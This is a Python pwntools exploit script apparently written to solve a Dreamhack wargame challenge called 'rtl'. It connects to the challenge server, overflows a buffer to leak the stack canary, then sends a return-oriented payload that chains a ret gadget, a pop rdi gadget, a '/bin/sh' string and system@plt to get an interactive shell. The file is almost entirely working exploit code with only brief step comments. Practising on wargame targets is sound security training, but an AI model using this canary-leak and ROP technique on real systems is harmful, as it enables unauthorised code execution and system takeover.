
from pwn import *

#p = process("./rtl")
p = remote("host3.dreamhack.games", 21438)
e = ELF("./rtl")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.arch = 'amd64'
context.log_level = 'debug'

def slog(n,m): return success(":".join([n,hex(m)]))


buf = b"A"*(0x40-0x8+0x1)

# [1] Leak the Canary
p.sendafter("Buf: ", buf)
p.recvuntil(buf)
cnry = u64(b"\x00"+p.recvn(7)) #u64(b"\x00" + p.recvn(7))
slog("canary", cnry)

# [2] find PLT addresses, Overwrite
pop_rdi = 0x400853
binsh_addr = 0x400874
sys_plt = 0x4005d0 #e.plt["system"]
ret = 0x400285 #596
slog("pop_rdi", pop_rdi)
slog("binsh_addr", binsh_addr)
slog("sys_plt", sys_plt)
slog("return address", ret)

# [3] exploit
payload = b"A"*0x38 + p64(cnry) + b"B"*0x8
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(sys_plt)
#print("payload", payload)

p.sendafter("Buf: ", payload)
p.interactive()